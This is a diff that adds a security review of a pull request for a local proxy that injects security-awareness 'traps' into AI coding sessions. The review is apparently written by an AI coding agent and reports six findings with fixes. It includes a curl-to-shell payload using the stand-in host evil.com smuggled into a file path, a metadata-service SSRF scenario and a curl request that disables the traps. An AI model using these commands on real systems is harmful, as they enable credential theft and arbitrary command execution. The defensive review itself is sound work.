@@ -1,0 +1,272 @@
+Security Review - PR #6 (feat/copilot-connect-proxy)
+======================================================
+Reviewer: Claude Code (Security Engineering Mode)
+Date: 2026-03-26
+Confidence threshold: >= 0.80 only
+
+
+FINDING 1 - HIGH - Open Forward Proxy (SSRF / Internal Network Pivoting)
+=========================================================================
+File: internal/server/connect.go
+Lines: 101-143, 361-378
+
+Description:
+The proxy accepts HTTP CONNECT requests from any local process without
+authentication. Non-MITM hosts are tunnelled as plain TCP with no
+restriction on the destination address. This means any local process
+can reach internal network addresses that are otherwise firewalled from
+the developer's machine - including cloud metadata endpoints
+(169.254.169.254), other localhost services, or RFC-1918 addresses -
+simply by setting HTTPS_PROXY=http://localhost:7331.
+
+The only guard is `shouldMITM(host)`, which controls whether TLS
+termination is applied, NOT whether the connection is allowed at all.
+Non-MITM hosts fall through to `handlePlainTunnel`, which calls
+`net.DialTimeout("tcp", targetAddr, 10*time.Second)` unconditionally.
+
+Exploit scenario:
+1. Any web page in the developer's browser (via a fetch/XHR with
+   credentials), or any other local process, can issue:
+     CONNECT 169.254.169.254:80 HTTP/1.1
+   to the proxy and receive a tunnelled TCP connection to the AWS/GCP/
+   Azure metadata service. The attacker can read IAM credentials without
+   touching the developer's terminal.
+2. An untrusted npm package running during `npm install` (or any
+   subprocess) can set HTTPS_PROXY to pivot to services on the LAN
+   that would normally be unreachable from the developer's workstation.
+3. Internal services listening on non-standard localhost ports
+   (databases, admin panels, other development servers) are similarly
+   exposed.
+
+Note: the proxy only binds to all interfaces via `addr := fmt.Sprintf(":%d", cfg.ProxyPort)` (server.go:112), so if the machine is dual-homed this extends to other network interfaces as well.
+
+Confidence: 0.95
+
+Recommended fix:
+Block CONNECT to RFC-1918, loopback (except the proxy's own health
+endpoint), and link-local ranges. Add an allowlist or denylist before
+`handlePlainTunnel` is called.
+
+
+FINDING 2 - HIGH - Unauthenticated /hooks/inject-trap Endpoint
+===============================================================
+File: internal/server/hook.go
+Lines: 192-255
+
+Description:
+The `/hooks/inject-trap` endpoint has NO authentication check
+whatsoever - not even the optional X-Hook-Secret that
+`HandlePreToolUse` supports. Any local process (or, given the
+bind-all-interfaces issue above, any process that can reach the proxy)
+can POST to this endpoint and force the proxy to:
+  a) Call `ShouldInject()` which sets the internal `pendingInject` flag
+  b) Call `RegisterTrap()` which writes a trap file to disk and records
+     the trap as "active" in the engine
+
+This allows an adversary to inject an arbitrary trap command into the
+next AI session, controlled by the attacker, not by the safety-
+validated template set. The `TrapCommand` that gets registered comes
+from the selected YAML template (so the attacker cannot choose a
+completely arbitrary command through this path alone), but they CAN
+control which template is selected by crafting the `command` field in
+ToolInput to match specific keywords in `triggers.keywords`, and by
+timing the request to coincide with a real AI session.
+
+More importantly: the attacker can flood this endpoint to exhaust the
+cooldown, cause trap-state corruption, or simply suppress legitimate
+traps by constantly registering their own active trap (engine returns
+false from ShouldInject while one is already active).
+
+In contrast, `/hooks/pre-tool-use` at least checks `hookSecret` when
+configured. inject-trap skips that check entirely:
+
+  func (hh *HookHandler) HandleInjectTrap(...) {
+      body, err := io.ReadAll(r.Body)  // no auth check before this
+
+Exploit scenario:
+  curl -s -XPOST http://localhost:7331/hooks/inject-trap \
+    -H 'Content-Type: application/json' \
+    -d '{"hook_event_name":"PreToolUse","tool_name":"Bash",
+         "tool_input":{"command":"git push"}}'
+
+This registers a trap and prevents any real trap from being injected
+until this one expires, effectively disabling the security awareness
+training for the current session without the developer noticing.
+
+Confidence: 0.90
+
+Recommended fix:
+Apply the same X-Hook-Secret check from HandlePreToolUse to
+HandleInjectTrap.
+
+
+FINDING 3 - HIGH - Shell Wrapper Injects Executable Path Without Sanitization
+==============================================================================
+File: cmd/agentsaegis/cmd_setup_shell.go
+Lines: 38-90 (shellWrapper function)
+
+Description:
+The binary path obtained from `os.Executable()` + `filepath.EvalSymlinks()`
+is interpolated directly into the shell profile via `fmt.Sprintf` with
+`%s` formatters. The resulting string is written verbatim into the
+user's .zshrc / .bashrc.
+
+If the binary path contains shell metacharacters - single quotes,
+backticks, dollar signs, newlines, semicolons - they will be
+interpreted by the shell when the profile is sourced. The Go binary
+path is determined at run-time from the process's own `argv[0]` path,
+so a malicious actor who can control where the `agentsaegis` binary is
+installed (e.g., via a supply-chain attack on the Homebrew formula, or
+by placing a binary in a path with a crafted name) can inject arbitrary
+shell commands into the developer's profile.
+
+In practice the install path comes from `brew install` or the installer
+script, so the attack surface is limited to supply-chain compromise of
+the install mechanism - however the path is completely unsanitized at
+the code level.
+
+Concrete example: if the binary were installed at
+  /usr/local/bin/agentsaegis$(curl -s evil.com|sh)
+then `shellWrapper` would embed that string literally inside the
+`_aegis_ensure_proxy()` function body, executing the injected command
+every time a new shell starts.
+
+The fish variant (lines 93-148) has the same issue with `set -l _e "%s"`.
+
+Confidence: 0.82
+
+Recommended fix:
+Single-quote the exe path when embedding into bash/zsh:
+  _e='%s'
+and escape any embedded single quotes in the path (replace ' with '\'').
+For fish, use --  set -l _e '%s'  with similar quoting.
+
+
+FINDING 4 - MEDIUM - CA Private Key World-Readable Race Window
+==============================================================
+File: internal/server/tls.go
+Lines: 118, 126 (writePEM calls)
+
+Description:
+When generating a new CA, the cert is written first (line 118) with
+permissions 0644, and then the key is written (line 126) with 0600.
+However `writePEM` uses `os.OpenFile(..., os.O_CREATE|os.O_TRUNC, perm)`
+which creates the file with the specified permissions atomically only
+if the file does not yet exist. The sequence is:
+
+  1. ca.pem  created at 0644  (correct)
+  2. ca-key.pem created at 0600  (correct at creation)
+
+The problem is that if a concurrent process reads the directory between
+steps 1 and 2, `fileExists(keyPath)` in `EnsureCA` returns false for
+the key but true for the cert. The next call to `EnsureCA` (e.g., from
+`trust-cert` spawned in a script) will call `generateCA` again and
+overwrite the cert (invalidating the already-installed CA) while
+creating a new key.
+
+More critically: if `ca-key.pem` already exists from a previous run
+but with incorrect permissions (e.g., 0644 set by a bug or umask),
+`loadCA` loads it without checking or fixing the permissions. The key
+remains world-readable for the lifetime of the process with no warning.
+
+Exploit scenario:
+Any local user on a shared developer machine (or in a container with a
+shared volume) can read `~/.agentsaegis/ca-key.pem` if the file was
+created with wrong permissions (wrong umask, previous version of the
+code) and use it to sign certificates for any MITM host - not just the
+Copilot domains - achieving a full MITM capability against the user's
+browser and other TLS clients that trust the installed CA.
+
+Confidence: 0.80
+
+Recommended fix:
+After loadCA, explicitly verify and tighten permissions on ca-key.pem
+with `os.Chmod`. Also check permissions before trusting the loaded key.
+Use a temp-file-then-rename pattern for atomic writes, or write both
+files before either is visible.
+
+
+FINDING 5 - HIGH - Unauthenticated Hook Endpoint Allows Trap Suppression from Network
+======================================================================================
+File: internal/server/server.go
+Lines: 112-113 (bind address)
+File: internal/server/hook.go
+Lines: 78-87
+
+Description:
+The proxy binds on `:%d` (all interfaces) rather than `127.0.0.1:%d`.
+This means the hook endpoints and the CONNECT handler are reachable
+from the local network, not just from the loopback interface.
+
+The hook secret (`X-Hook-Secret`) is optional and defaults to empty
+(server.go:46-48). When empty, the log message says "any local process
+can call it" - but in fact "any host on the local network" can call it
+because the server is bound to all interfaces.
+
+On a developer's laptop connected to an office network or a coffee-shop
+Wi-Fi, any other machine on the same network can:
+  - POST to /hooks/pre-tool-use to resolve/manipulate active traps
+  - POST to /hooks/inject-trap to poison the trap state
+  - Use the proxy as a forward proxy (Finding 1) to reach the
+    developer's internal services
+
+Confidence: 0.88
+
+Recommended fix:
+Bind to 127.0.0.1 explicitly: `addr := fmt.Sprintf("127.0.0.1:%d", cfg.ProxyPort)`.
+The shell wrapper health check already uses `http://localhost:...` so
+the change is backward-compatible.
+
+
+FINDING 6 - MEDIUM - Intercepted API Credentials Logged in Debug Mode
+=======================================================================
+File: internal/server/connect.go
+Lines: 229-230, 339-340
+
+Description:
+In debug mode (`ch.logger.Debug`), the full upstream URL including any
+query parameters is logged:
+
+  ch.logger.Debug("MITM forwarding request", "method", req.Method, "url", upstreamURL)
+
+The `upstreamURL` is constructed as:
+  upstreamURL := fmt.Sprintf("https://%s%s", hostname, req.RequestURI)
+
+`req.RequestURI` is taken verbatim from the tunnelled HTTP request,
+which for GitHub Copilot API calls includes the path but could also
+include query parameters carrying OAuth tokens or session identifiers.
+
+More critically, for OAI SSE processing (line 339), a 300-character
+preview of each SSE line is logged at debug level. SSE lines for
+Copilot API responses contain the full AI response text including
+any tool call arguments - which may contain secrets, file contents,
+or other sensitive data that the developer typed into the prompt.
+
+With the `--debug` flag enabled (or `log_level: debug` in config),
+all intercepted Copilot response content is written to stderr, which
+is then captured in `aegis.log` when running as a service.
+
+Confidence: 0.85
+
+Recommended fix:
+Sanitize the URL before logging (strip query string). Do not log SSE
+line previews in debug mode, or limit to non-data lines only.
+
+
+SUMMARY
+=======
+Finding | Severity | Confidence | Category
+--------|----------|------------|-------------------------------------------
+  1     | HIGH     | 0.95       | Open forward proxy / SSRF
+  2     | HIGH     | 0.90       | Authentication bypass (inject-trap endpoint)
+  3     | HIGH     | 0.82       | Shell injection (profile injection)
+  4     | MEDIUM   | 0.80       | TLS/crypto - CA key permission race
+  5     | HIGH     | 0.88       | Authentication bypass (bind all interfaces)
+  6     | MEDIUM   | 0.85       | Data exposure (credential/content logging)
+
+The two most critical issues to fix before merging are:
+  - Finding 1 (open forward proxy) and Finding 5 (bind all interfaces):
+    together these make the proxy usable as a network pivot from any
+    machine on the same LAN.
+  - Finding 2 (no auth on inject-trap): trivially exploitable by any
+    local process to defeat the security training mechanism.
